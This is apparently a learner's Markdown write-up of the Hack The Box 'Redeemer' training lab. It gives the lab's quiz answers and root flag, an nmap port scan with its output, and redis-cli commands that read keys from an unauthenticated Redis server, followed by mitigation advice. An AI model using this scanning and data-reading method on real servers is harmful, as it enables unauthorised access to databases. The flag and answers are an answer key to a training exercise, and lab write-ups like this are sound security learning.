---
id: starting_point_redeemer
aliases: []
tags:
  - redis
  - database
  - vulnerability_assessment
  - reconnaissance
  - anonymous/guest_access
date: "2025-01-24"
---

# HTB_starting_point_meow

- Platform: Hack The Box
- Category:CTF
- Difficulty: Very Easy
- Estimated Time: Under 10 minutes

---

## 💡 **Objective**

- Which TCP port is open on the machine? `6379`
- Which service is running on the port that is open on the machine? `redis`
- What type of database is Redis? Choose from the following options: (i) In-memory Database, (ii) Traditional Database `In-memory Database`
- Which command-line utility is used to interact with the Redis server? Enter the program name you would enter into the terminal without any arguments. `redis-cli`
- Which flag is used with the Redis command-line utility to specify the hostname? `-h`
- Once connected to a Redis server, which command is used to obtain the information and statistics about the Redis server? `info`
- What is the version of the Redis server being used on the target machine? `5.0.7`
- Which command is used to select the desired database in Redis? `select`
- How many keys are present inside the database with index 0? `4`
- Which command is used to obtain all the keys in a database? `keys *`
- Submit root flag

  ```bash
   03e1d2b376c37ab3f5319922053953eb
  ```

---

## 🛠️ **Preparation**

- **Tools Used:** [nmap, redis]
- **Environment:** [Arch Linux]
- **Commands to Remember:**

  - Ping target
    ```bash
    ping 10.129.84.208
    ```
  - Scan all port with nmap
    ```bash
    sudo nmap -p- -sV -oN starting_point_fawn.txt 10.129.84.208
    ```
  - Install Redis
    ```bash
    sudo apt install redis-tools
    ```
    ```bash
    sudo pacman -S redis
    ```

---

## 🔍 **Enumeration**

- **Initial Reconnaissance:**
  - Target IP/URL: `10.129.84.208`
  - Open Ports/Services:
    ```plaintext
    PORT      STATE    SERVICE VERSION
    6379/tcp  open     redis   Redis key-value store 5.0.7
    ```
  - ## Vulnerabilities Identified:
- **Detailed Findings:**
  - Unauthenticated Redis Acces

---

## 🧩 **Exploitation**

- **Steps Taken:**

  1. Scanning IP with nmap

  ```bash
  # Nmap 7.95 scan initiated Fri Jan 24 09:29:40 2025 as: nmap -sS -T4 -p- -sV -O -oN starting_point_redeem_T4.txt 10.129.84.208
  Warning: 10.129.84.208 giving up on port because retransmission cap hit (6).
  Nmap scan report for 10.129.84.208
  Host is up (0.26s latency).
  Not shown: 65522 closed tcp ports (reset)
  PORT      STATE    SERVICE VERSION
  6379/tcp  open     redis   Redis key-value store 5.0.7
  9422/tcp  filtered unknown
  10559/tcp filtered unknown
  17523/tcp filtered unknown
  22057/tcp filtered unknown
  22267/tcp filtered unknown
  22603/tcp filtered unknown
  35985/tcp filtered unknown
  39016/tcp filtered unknown
  54935/tcp filtered unknown
  55248/tcp filtered unknown
  63229/tcp filtered unknown
  65141/tcp filtered unknown
  Device type: general purpose
  Running: Linux 4.X|5.X
  OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
  OS details: Linux 4.15 - 5.19
  Network Distance: 2 hops

  OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
  # Nmap done at Fri Jan 24 09:50:58 2025 -- 1 IP address (1 host up) scanned in 1278.49 seconds
  ```

  2. Connect to redis, enumaration and show information about redis server

  ```bash
  redis-cli -h 10.129.145.2 -p 6379
  ```

  3. Show information about redis server

  ```bash
  10.129.145.2:6379> info
  ```

  4. Select index database

  ```bash
  10.129.145.2:6379> select 0
  ```

  5. List all Keys

  ```bash
  10.129.145.2:6379> keys *
  ```

  6. Get the flag

  ```bash
  10.129.145.2:6379> get flag
  ```

  7. cat the flag
     `03e1d2b376c37ab3f5319922053953eb"`

- **Challenges Faced:**
  - Understand the redis-cli options, -h, -p

---

## 🚀 **Post-Exploitation**

- **Access Gained:**
  - User: [user]
  - Privileges: [limited]
- **Privilege Escalation Steps:**
  - Not use escalation, just get the flag

---

## 📝 **Key Learnings**

- **What I Learned:**
  - Connecting to the server using redis-cli
  - Scanning all port
    ```bash
    nmap -sS -T4 -p- -sV -O -oN starting_point_redeem_T4.txt 10.129.84.208
    ```
- **Mistakes to Avoid:**
  - Read the manual from HTB

---

## 🔧 **How To Mitigate Vulnerabilities**

- **Vulnearbilties Encountered:**

  - Vuln:
    - Unathenticated Redis Access
  - Fix:
    - Activate password login
    - Use TLS for encryption
    - Restricted Network Access
    - Use strong authentication
    - Firewall Rules
    - Update Software Redis

- ## **Helpful Resources:**
  - [Redis Command](https://redis.io/docs/latest/commands)

---

## 🎯 **Post-Lab Reflection**

- **How Could I Improve?**
  - Improve the nmap scan options using `-p-`
- **Next Steps:**
  - Practice how to activate or deactivate Redis services
